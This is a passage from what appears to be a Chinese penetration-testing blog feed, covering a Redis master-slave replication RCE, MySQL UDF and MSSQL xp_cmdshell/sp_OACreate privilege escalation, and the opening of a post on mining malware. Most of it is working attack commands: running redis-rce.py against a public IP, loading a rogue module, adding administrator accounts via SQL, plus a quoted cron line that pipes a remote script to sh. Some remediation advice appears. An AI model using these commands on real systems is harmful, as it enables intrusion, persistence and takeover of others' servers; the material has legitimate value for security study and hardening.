class="built_in">cd</span> RedisModules-ExecuteCommand</span><br><span class="line">make</span><br></pre></td></tr></table></figure><ol start="2"><li>脚本利用Redis主从复制RCE</li></ol><blockquote><ul><li><p><a href="https://github.com/puckiestyle/RedisModules-ExecuteCommand">https://github.com/puckiestyle/RedisModules-ExecuteCommand</a></p></li><li><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p></li><li><p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p></li><li><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p></li></ul></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/redis-rce</span><br><span class="line"><span class="built_in">cd</span> redis-rce</span><br><span class="line">python3 -m pip install -r requirements.txt</span><br><span class="line"><span class="built_in">cp</span> /root/RedisModules-ExecuteCommand/module.so ./module.so</span><br><span class="line">python3 redis-rce.py -r 124.71.45.28 -p 6379 -L 124.223.217.243  -P 7890 -f module.so</span><br></pre></td></tr></table></figure><blockquote><p>解释：<br>-r 124.71.45.28 -p 6379 未授权主机的信息<br>-L 47.104.255.11 本地主机<br>-P 7890当前主机信息和端口<br>相当于创建一个假的redis服务器，有服务器的一些功能，监听攻击机的7890端口<br>脚本创建的假的服务器<br><code>cp /root/RedisModules-ExecuteCommand/module.so ./module.so</code>就是将编译的so扩展文件复制到我们假的redis主服务器上</p></blockquote><p><strong>注意事项：</strong>自己曾经犯的一个错误：</p><blockquote><p>注意：此时主机用内网地址进行攻击时（也就是虚拟redis主机）此时！，从机是无法访问我们的内网的主机的！！！</p><p>所以才会报错！！！！</p><p>实验环境建议都是具有公网ip地址的主机，将文件复制到我的vps124.223.217.243</p><p>还有！！不要忘记打开VPS的防火墙</p></blockquote><p>继续实验。连接成功</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209250020639.png" alt="image-20220925001817232" style="zoom: 50%;" /><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关于redis假主机py脚本的说明：</span></span><br><span class="line">python3 redis-rce.py -r 124.71.45.28 -p 6379 -L 124.223.217.243  -P 7890 -f module.so</span><br><span class="line"><span class="comment"># Redis RCE</span></span><br><span class="line">A exploit <span class="keyword">for</span> Redis 4.x/5.x RCE, inspired by [Redis post-exploitation]</span><br><span class="line"></span><br><span class="line">usage: redis-rce.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-f FILE] [-a AUTH] [-v]</span><br><span class="line"></span><br><span class="line">Redis 4.x/5.x RCE with RedisModules</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>             show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -r RHOST, --rhost RHOST    target host</span><br><span class="line">  -p RPORT, --rport RPORT    target redis port, default 6379</span><br><span class="line">  -L LHOST, --lhost LHOST    rogue server ip</span><br><span class="line">  -P LPORT, --lport LPORT    rogue server listen port, default 21000</span><br><span class="line">  -f FILE, --file FILE   RedisModules to load, default exp.so</span><br><span class="line">  -a AUTH, --auth AUTH    redis password</span><br><span class="line">  -v, --verbose          show more info</span><br></pre></td></tr></table></figure><ol start="3"><li>执行命令</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 124.71.45.28 -p 6379</span><br><span class="line">config get dir</span><br><span class="line">config get dbfilename</span><br><span class="line">system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h4 id="脚本原理"><a href="#脚本原理" class="headerlink" title="脚本原理"></a>脚本原理</h4><ol><li>首先连接目标未授权redis服务，在本地编译好外部扩展即so文件，把so文件转码存入本地redis数据库</li><li>登录目标主机，发送配置主从模式的命令到目标redis服务</li></ol><blockquote><p>脚本在靶机上执行命令如下：</p><p>到目标服务器上设置主从关系，主服务器指定我们的本地redis</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">slaveof 47.104.255.11 7890           <span class="comment">#设置主机为此机器（我们创建的假的redis主机），执行命令的就是从机</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename module.so<span class="comment">#待同步后，设置备份路径和备份文件名（xx.so）</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p>监听 124.71.45.28:7890 作为 redis 主机</p></li><li><p>目标机器(从机)从主机复制 module.so 内容保存到 redis 服务器的 module.so文件中</p></li><li><p>目标机器加载 module.so 扩展模块(1.55.10)</p></li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MODULE LOAD ./module.so<span class="comment">#然后加载备份数据库</span></span><br></pre></td></tr></table></figure><ol start="6"><li>然后就可以通过redis执行命令反弹shell了</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system.exec &quot;命令&quot;</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>限制权限</li></ol><blockquote><p>使用低权限且shell类型为&#x2F;sbin&#x2F;nologin的用户运行redis，修改或禁用高危命令(redis.conf配置文件中新增以下内容)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command FLUSHDB &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command KEYS &quot;&quot;</span><br></pre></td></tr></table></figure></blockquote><ol start="2"><li>从IP和端口上入手</li></ol><blockquote><p>禁止公网开放Redis端口,可以在防火墙上禁用6379 Redis的端口。</p><p>针对外部攻击：不开放6379端口，或者改为其它端口。使用白名单方式限制哪些来源IP可访问服务器。</p><p>内部攻击：限制哪些来源IP可访问服务器</p></blockquote><ol start="3"><li><p>检查authorized_keys是否非法，如果已经被修改，则可以重新生成并恢复，不能使用修改过的文件。并重启ssh服务（service ssh restart）</p></li><li><p>增加 Redis 密码验证，设置复杂度高的密码</p></li></ol><p>首先停止REDIS服务，打开redis.conf配置文件（不同的配置文件，其路径可能不同）<code>/etc/redis/6379.conf</code>,找到<code># requirepass foobared</code>去掉前面的#号，然后将foobared改为自己设定的密码，重启启动redis服务。</p><ol start="5"><li>修改conf文件禁止全网访问，打开<code>6379.conf</code>文件，找到<code>bind 0.0.0.0</code>前面加上# （禁止全网访问）。</li><li>可参考加固修改命令:</li></ol><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>port</td><td>修改redis使用的默认端口</td></tr><tr><td>bind</td><td>设定redis监听的专用IP</td></tr><tr><td>requirepass</td><td>设定redis连接的密码</td></tr><tr><td>rename-command CONFIG “”</td><td>禁用CONFIG命令</td></tr><tr><td>rename-command info info2</td><td>重命名info为info2</td></tr></tbody></table><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol><li>在学习redis的时候，docker搭建了redis环境，被公网上人估计了docker里面的redis，记录一下</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">124.223.217.243:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;backup2&quot;</span></span><br><span class="line">2) <span class="string">&quot;backup3&quot;</span></span><br><span class="line">3) <span class="string">&quot;backup1&quot;</span></span><br><span class="line">4) <span class="string">&quot;backup4&quot;</span></span><br><span class="line">47.104.255.11:6379&gt; get backup1</span><br><span class="line"><span class="string">&quot;\n\n\n*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh\n\n&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可以看到被人在一个键中写入了一个恶意脚本，并且每隔两分钟进行复制一份,并且在定时任务中也写了东西</span></span><br><span class="line"><span class="comment">#去/etc/crontab查看        Linux下面定时任务目录，下面有详细介绍</span></span><br></pre></td></tr></table></figure><ol start="2"><li>利用fofa批量检测此类公网上的未授权漏洞</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209250026045.png" alt="image-20220925002619783" style="zoom:50%;" /><ol start="3"><li>复现其他1-2个未授权漏洞</li><li>编写未授权漏洞利用检测脚本</li></ol><blockquote><p>此脚本就可以批量检测公网有哪些机器具有未授权漏洞</p></blockquote><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><blockquote><ul><li><p><a href="https://www.cnblogs.com/cxxjohnson/p/9072383.html">redis常用命令大全</a></p></li><li><p><a href="https://paper.seebug.org/975/">Redis 基于主从复制的 RCE 利用方式</a></p></li><li><p><a href="https://www.hetianlab.com/expc.do?ce=2afbad05-7336-4e91-b3b1-a6d3d08f7054">实验:Docker未授权访问漏洞</a></p></li><li><p><a href="https://www.hetianlab.com/expc.do?ce=108b84d0-2bf1-4606-9826-79ade46479a3">实验:Redis未授权访问漏洞</a></p></li><li><p><a href="https://www.hetianlab.com/expc.do?ce=2afbad05-7336-4e91-b3b1-a6d3d08f7054">实验:Docker未授权访问漏洞</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 历史漏洞 </tag>
            
            <tag> 未授权访问漏洞 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x24 - 应用程序提权</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x24-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x24-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h2><h2 id="Mysql提权利用场景"><a href="#Mysql提权利用场景" class="headerlink" title="Mysql提权利用场景"></a>Mysql提权利用场景</h2><ol><li>拥有数据库账号密码</li><li>Webshell可以连接数据库，能够写文件</li><li>可操作数据库</li></ol><h3 id="如何获取数据库账号密码"><a href="#如何获取数据库账号密码" class="headerlink" title="如何获取数据库账号密码?"></a>如何获取数据库账号密码?</h3><ol><li>找数据库配置文件</li><li>通过webshell对数据库进行本地爆破</li><li>Hash获取mysql密码</li></ol><!----><pre><code>F:\Haoran\download\Server\phpStudy_64\Extensions\MySQL5.7.26\data\mysql\user.MYD文件中包含用户密码的hash值16进制查看器即可打开看到再复制到md5解密网站去查找其真实的密码 </code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208050131849.png" alt="image-20220805013130703"></p><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>udf提权指的是<strong>利用注入漏洞或其他漏洞</strong>获取了<strong>数据库操作权限</strong>后，通过数据库<strong>输出具有提权功能的文件</strong>并执行提权操作</p><h3 id="udf简介："><a href="#udf简介：" class="headerlink" title="udf简介："></a>udf简介：</h3><blockquote><p>DLL文件（Dynamic liked library动态链接库）简介<a href="https://www.bilibili.com/video/BV18Y4y1P7oK?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV18Y4y1P7oK?spm_id_from=333.337.search-card.all.click</a></p><p>程序在运行前会依次在<strong>exe程序目录、Windows系统目录、Windows目录、当前目录、path指定目录</strong>中查找需要调用的dll文件</p></blockquote><p><strong>user defined function</strong>，用户定义函数，为用户提供了一种高效创建函数的方式</p><p>攻击者编写调用系统cmd命令（linux下相当于调用shell命令）的udf.dll文件，并将udf.dll导出到<strong>指定目录</strong><br>下，攻击者创建一个指向udf.dll的自定义函数func，每次在数据库查询中执行func函数等价于在cmd命令中执<br>行命令。</p><p><strong>核心:Windows其</strong>服务一般是以system权限启动，通过mysql服务启动的cmd将会是system权限的。利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库！</p><h3 id="DLL文件上传路径："><a href="#DLL文件上传路径：" class="headerlink" title="DLL文件上传路径："></a>DLL文件上传路径：</h3><pre><code>Windows2003：C:\windows\MySQL 5.1版本后：mysql安装目录\lib\plugin\目录下，一般来说是不存在的lib目录 需要自行创建</code></pre><h3 id="前置知识：ADS流"><a href="#前置知识：ADS流" class="headerlink" title="前置知识：ADS流"></a>前置知识：ADS流</h3><blockquote><p><a href="https://learnku.com/docs/server-learn/1.0/hide-files/13195#6824f8">https://learnku.com/docs/server-learn/1.0/hide-files/13195#6824f8</a></p></blockquote><p>在MySQL5.1以后的环境下只有将udf.dll文件导出到mysql安装目录<code>\lib\plugin\</code>目录下才能成功，但是很多时候mysql安装目录下并不存在lib目录，mysql文件操作也并不能直接创建目录，此时需要通过<strong>NTFS ADS流</strong>来创建目录。</p><p>NTFS ADS全称为<strong>NTFS交换数据流（NTFS Alternate Data Streams）</strong>，是NTFS文件系统的一个特性。NTFS文件系统中的每一个文件可以包括多个数据流，每个文件数据流的完整格式如下：</p><pre><code>&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;&lt;文件名&gt;:&lt;流名&gt; :&lt;流种类&gt;</code></pre><ul><li><p>只有一个data流时，stream name通常可以省略，stream type也可以成为attribute type。</p></li><li><p>我们通常看到的是文件的data流，其它数据流都处于隐藏状态。</p></li><li><p>当attribute type为$INDEX_ALLOCATION 时，表明该该数据流的宿主是文件夹。</p></li></ul><p><strong>所以可以通过 mysql 导出数据到<code>directory_path(目录路径）:: $INDEX_ALLOCATION</code>文件的方法来创建directory_path目录。</strong></p><h4 id="DATA流创建"><a href="#DATA流创建" class="headerlink" title="#$DATA流创建"></a>#$DATA流创建</h4><ol><li>创建宿主文件</li></ol><!----><pre><code>echo &quot;this is a test file&quot; &gt; test.txt </code></pre><ol><li>关联数据流</li></ol><!----><pre><code>echo &quot;this is a ads file&quot; &gt; test.txt:aaa:$data 注释：test.txt:aaa:$data &lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;&lt;文件名&gt;  :&lt;流名&gt;          :&lt;流种类&gt;</code></pre><ol><li>查看test.txt文件，读取正常</li></ol><!----><pre><code>type test.txt &quot;this is a test file&quot; </code></pre><ol><li>查看流文件</li></ol><!----><pre><code>dir /r 2021/03/05  10:26                24 test.txt                                  23 test.txt:aaa:$DATA notepad test.txt:aaa 看不到文件内容</code></pre><ol><li>流文件无法直接删除，只能删除源文件</li></ol><!----><pre><code>del /f test.txt </code></pre><h4 id="ADS流文件应用"><a href="#ADS流文件应用" class="headerlink" title="ADS流文件应用"></a>ADS流文件应用</h4><ol><li>创建隐藏文件</li></ol><!----><pre><code>type pass.txt &gt; song.mp3:password:$DATA </code></pre><ol><li>$INDEX_ALLOCATION流创建文件夹 hellp</li></ol><!----><pre><code>echo  &gt; hello::$INDEX_ALLOCATION </code></pre><h3 id="前置知识：Mysql写文件及创建文件夹"><a href="#前置知识：Mysql写文件及创建文件夹" class="headerlink" title="前置知识：Mysql写文件及创建文件夹"></a>前置知识：Mysql写文件及创建文件夹</h3><h4 id="mysql写文件"><a href="#mysql写文件" class="headerlink" title="#mysql写文件"></a>#mysql写文件</h4><pre><code>select &#39;111&#39; into dumpfile &#39;D:\\1.txt&#39;; select &#39;111&#39; into outfile &#39;D:\1.txt&#39;; </code></pre><p>outfile函数可以导出多行，而dumpfile只能导出一行数据<br><strong>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</strong></p><h4 id="mysql创建文件夹"><a href="#mysql创建文件夹" class="headerlink" title="#mysql创建文件夹"></a>#mysql创建文件夹</h4><pre><code>select 233 into dumpfile &#39;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#39;; </code></pre><h3 id="UDF提权之前需要做的事情"><a href="#UDF提权之前需要做的事情" class="headerlink" title="UDF提权之前需要做的事情"></a>UDF提权之前需要做的事情</h3><ol><li>查看是否有写权限</li></ol><!----><pre><code>show global variables like &#39;secure%&#39;; secure_file_priv为空时表示我们有权限写入</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208050136483.png" alt="image-20220805013601358" style /><ol><li>查看mysql安装路径和版本</li></ol><!----><pre><code>安装路径：show variables like &#39;%char%&#39;; select @@datadir; 版本：Select version(); </code></pre><ol><li>查看目标主机系统架构</li></ol><!----><pre><code>show variables like &#39;%compile%&#39;</code></pre><p>有x32和x64架构的dll文件选择</p><ol><li>查看plugin是否存在 （一般来说是不存在的 需要自行创建）</li></ol><!----><pre><code>show variables like &#39;plugin%&#39;;</code></pre><ol><li>通过ADS流的方式创建lib目录(如果能通过蚁剑工具创建目录，当然也是可以的)</li></ol><!----><pre><code>select 233 into dumpfile &#39;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#39;;  这里是Windows环境，需要对之进行转义所以用\\</code></pre><ol><li>提前准备好我们需要写入的udf.dll文件！</li></ol><p>在<code>&quot;F:\Learning\ComputerScience\Cyber Security\Tools-Hetian\Tools-Hetian\SQL注入\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_&quot;</code>目录下有sqlmap提供的udf提权文件！</p><h3 id="UDF提权步骤-开始写入文件"><a href="#UDF提权步骤-开始写入文件" class="headerlink" title="UDF提权步骤-开始写入文件"></a>UDF提权步骤-开始写入文件</h3><p>目标主机开启MySQL<strong>远程连接</strong>，并且攻击者已经获得MySQL数据库连接的用户名和密码信息（user.MDY文件)，通过udf手工提权获得操作系统管理员权限。</p><p>蚁剑shell会话右击，连接其数据库，输入用户名及密码，mysql或者mysqli的方式</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208050132309.png" alt="image-20220805013214093" style /><p>【在进行下面步骤之前需要先对mysql进行检验上一小节<strong>UDF提权之前需要做的事情</strong>中的一些东西】</p><ol><li>创建临时表：</li></ol><!----><pre><code>create table temp_udf(udf BLOB);  BLOB全称为Binary Large Objects,即大型二进制对象</code></pre><ol><li>将udf.dll二进制数据插入临时表temp_udf中，$binaryCode为udf.txt文件中复制的内容。</li></ol><!----><pre><code>insert into temp_udf values (CONVERT($binaryCode,CHAR)); </code></pre><ol><li>将udf.dll导出到mysql安装目录下的lib&#x2F;plugin&#x2F;udf.dll文件中:</li></ol><!----><pre><code>select udf from temp_udf into dumpfile &quot;C:/mysql/mysql-5.1.40-win32/lib/plugin/udf.dll&quot;或者直接写入字符串：select 0xString(替换成dll文件中的内容，别忘记前面加0x) into dumpfile &quot;C:/mysql/mysql-5.1.40-win32/lib/plugin/udf.dll&quot;</code></pre><ol><li>创建cmdshell或者sys_eval函数</li></ol><!----><pre><code>create function sys_eval returns string soname &#39;udf.dll’ </code></pre><ol><li>创建新用户添加到超级管理员组</li></ol><!----><pre><code>select sys_eval(&#39;net user udftester 123456 /add &amp; net localgroup administrators udftester /add’) </code></pre><ol><li>查看命令执行结果：</li></ol><!----><pre><code>select sys_eval(&#39;net localgroup administrators&#39;) </code></pre><ol><li>接下来就可以管理员身份登录</li><li>提权结束记得清除痕迹</li></ol><!----><pre><code>drop function sys_eval</code></pre><p><strong>注意：上面可以执行cmd命令，自然也可以执行powershell！我们自然就可以执行powershell脚本上线cs</strong></p><h2 id="msf自动利用"><a href="#msf自动利用" class="headerlink" title="#msf自动利用"></a>#msf自动利用</h2><pre><code>mysql允许外联才可以使用：exploit/multi/mysql/mysql_udf_payload</code></pre><h1 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h1><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>msdn安装环境：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208050737596.png" alt="image-20220805073752311"></p><p>一直next即可安装成功！</p><h2 id="Mssql角色用户权限"><a href="#Mssql角色用户权限" class="headerlink" title="Mssql角色用户权限"></a>Mssql角色用户权限</h2><p><strong>（注意最后一个sysadmin，相当于administrator和root的权限）</strong></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290725579.png" alt="image-20220729072543419"></p><h3 id="Mssql常用命令"><a href="#Mssql常用命令" class="headerlink" title="Mssql常用命令"></a>Mssql常用命令</h3><pre><code>#查看数据库版本select @@version #查看数据库系统参数 exec master..xp_msver; #查看用户所属角色信息 sp_help srvrolemember #查看当前数据库 select db_name(); #查看当前账户权限 select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) #判断是否为sa权限 select IS_MEMBER(&#39;db_owner&#39;) #判断是否为dba权限 ，实际上只要是sa权限，必定有dba权限#禁用advanced options EXEC sp_configure &#39;show advanced options&#39;,0;GO RECONFIGURE;设为0，即禁用</code></pre><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><p>xp_cmdshell扩展存储过程（也可以说是一个组件），可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出。<br>由于xp_cmdshell 可以执行任何操作系统命令，所以一旦SQL Server管理员帐号（如sa）被攻破，那么攻击者就可以利用xp_cmdshell 在SQL Server中执行操作系统命令</p><h3 id="利用语法："><a href="#利用语法：" class="headerlink" title="利用语法："></a>利用语法：</h3><pre><code>exec master..xp_cmdshell &quot;dos命令&quot;如果可以利用，我们就可以利用这种方式执行powershell脚本，上线cs</code></pre><p>SQL Server 2000中默认是开启的<br>SQL Server 2005及以上版本中xp_cmdshell 默认是关闭的。<br>如果服务未开启，执行 xp_cmdshell 将会提示类似以下的内容：</p><pre><code>消息 15281，级别 16，状态 1，过程 xp_cmdshell，第 1 行</code></pre><p>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程‘sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。</p><p>系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。</p><pre><code>exec sp_configure &#39;show advanced options&#39;,1;reconfigure; #开启权限exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;#开启组件即将默认0改为1，即修改了权限</code></pre><h3 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h3><ol><li>判断用户权限</li></ol><p>只有sysadmin组的用户才能执行xp_cmdshell</p><pre><code>and (select IS_SRVROLEMEMBER (&#39;sysadmin&#39;))=1-- </code></pre><ol><li>判断数据库中是否存在xp_cmdshell组件</li></ol><!----><pre><code>and 1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;) </code></pre><ol><li>尝试通过xp_cmdshell执行命令，检测xp_cmdshell组件是否启用</li></ol><!----><pre><code>;exec master..xp_cmdshell “net user name password /add“ –</code></pre><ol><li>启用xp_cmdshell（类似用；进行堆叠注入）</li></ol><!----><pre><code>;exec sp_configure &#39;show advanced options&#39;,1;reconfigure;exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;-- </code></pre><ol><li>验证是否添加成功</li></ol><!----><pre><code>;exec master..xp_cmdshell &quot;ver&quot;-- </code></pre><ol><li>添加用户</li></ol><!----><pre><code>;exec master..xp_cmdshell &quot;net user alvin password /add&quot; --  </code></pre><ol><li>添加用户到管理员组</li></ol><!----><pre><code>;exec master..xp_cmdshell &quot;net localgroup administrators alvin /add&quot;--</code></pre><p>接下来就可以远程桌面登录！</p><h3 id="特殊情况："><a href="#特殊情况：" class="headerlink" title="特殊情况："></a>特殊情况：</h3><h4 id="无回显情况："><a href="#无回显情况：" class="headerlink" title="无回显情况："></a>无回显情况：</h4><p>通过调用系统命令，访问外部浏览器，如果成功表示开启成功，如何进行外带注入即可！！</p><h2 id="xp-cmdshell被删除禁用或出错"><a href="#xp-cmdshell被删除禁用或出错" class="headerlink" title="xp_cmdshell被删除禁用或出错"></a>xp_cmdshell被删除禁用或出错</h2><p>可以充分利用<strong>SP_OACreate</strong>进行提权：</p><ol><li>打开组件：</li></ol><!----><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE; exec sp_configure &#39;Ole Automation Procedures&#39; , 1;RECONFIGURE;</code></pre><ol><li>添加用户及移动到管理员组</li></ol><!----><pre><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user zhangsan 123456 /add&#39; declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators zhangsan /add&#39;</code></pre><ol><li>执行命令：</li></ol><!----><pre><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\programdata\1.txt&#39; --</code></pre><h2 id="沙盒模式（不太常用）"><a href="#沙盒模式（不太常用）" class="headerlink" title="沙盒模式（不太常用）"></a>沙盒模式（不太常用）</h2><p>沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.</p><p>如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的</p><ul><li>无法执行命令时，xp_regwrite可用</li><li>Access执行这个命令是有条件的，需要一个开关被打开</li></ul><p>#首先检查xp_cmdshell是否开启</p><pre><code>select count(*) from master.dbo.sysobjects where xtyoe=&#39;x&#39; and name=&#39;xp_cmdshell&#39; </code></pre><p>#开启沙盒模式</p><pre><code>exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,0 </code></pre><p>SandBoxMode参数含义（默认是2）<br>0：在任何所有者中禁止启用安全模式<br>1 ：为仅在允许范围内<br>2 ：必须在access模式下<br>3：完全开启<br>#添加用户</p><pre><code>select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39; ,&#39;;database=c:\windows\system32\ias\ias.mdb&#39; ,&#39;select shell(&quot;cmd.exe /c net user zhangsan 121345 /add&quot;)&#39;) select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39; ,&#39;;database=c:\windows\system32\ias\ias.mdb&#39; ,&#39;select shell(&quot;cmd.exe /c net localgroup administrators zhangsan /add&quot;)&#39;) </code></pre><h6 id=""><a href="#" class="headerlink" title=""></a></h6>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>挖矿病毒及应对措施</title>
      <link href="/%E7%9F%A5%E8%AF%86/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%8F%8A%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD.html"/>
      <url>/%E7%9F%A5%E8%AF%86/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%8F%8A%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>1.黑客通过挖矿程序窃取机密信息，比如机密文件、关键资产的用户名和密码等，导致资产遭受更进一步的资产损失。</p><p>2.黑客控制主机作为“肉鸡”攻击互联网上的其他单位，违反网络安全法。</p><p>3.黑客利用已经控制的机器，作为继续对业务系统区域渗透的跳板，产生更严重的网络安全攻击事件。</p><h1 id="原因排查"><a href="#原因排查" class="headerlink" title="原因排查"></a>原因排查</h1><p>一旦发现服务器被挖矿，应该首先查看挖矿进程所属的用户，根据挖矿进程的运行用户去排查该用户下是否还运行着其它进程，确定这些进程是否有上述经常被黑客利用的漏洞。如果有常见的漏洞，则应该重点对此进行排查找到原因</p><p>为什么会中挖矿病毒呢？</p><p>“挖矿病毒”一般因为疏于安全防护而感染:</p><p>■ 垃圾邮件：用户点击了钓鱼邮件并运行了含病毒的附件。</p><p>■ 软件捆绑：用户下载运行了非官方的破解软件。</p><p>■ 漏洞传播：用户的操作系统或软件存在漏洞，黑客利用漏洞植入挖矿病毒。</p><p>■ 网页挖矿：用户访问了来历不明的网页，该网页被植入挖矿脚本，浏览器会运行脚本进行挖矿。</p><h1 id="挖矿病毒判断"><a href="#挖矿病毒判断" class="headerlink" title="挖矿病毒判断"></a>挖矿病毒判断</h1><p>挖矿木马占用系统资源进行挖矿行为，一般电脑会有以下特征</p><ol><li>系统响应缓慢</li><li>CPU&#x2F;显卡使用率过高</li><li>内存&#x2F;带宽占用高</li></ol><h1 id="挖矿常用手段"><a href="#挖矿常用手段" class="headerlink" title="挖矿常用手段"></a>挖矿常用手段</h1><ol><li>未授权访问或弱口令：Redis 未授权访问、Docker API 未授权访问、Hadoop Yarn 未授权访问、NFS 未授权访问、Rsync 弱口令、PostgreSQL 弱口令、Tomcat 弱口令、SSH 弱口令、Telnet 弱口令、Windows 远程桌面弱口令</li><li>远程命令执行漏洞：WebLogic XML 反序列化漏洞、Jenkins 反序列化、Jboss 远程代码执行、Spring 远程代码执行、ElasticSearch 命令执行、永恒之蓝、Struts2 系列漏洞、常见 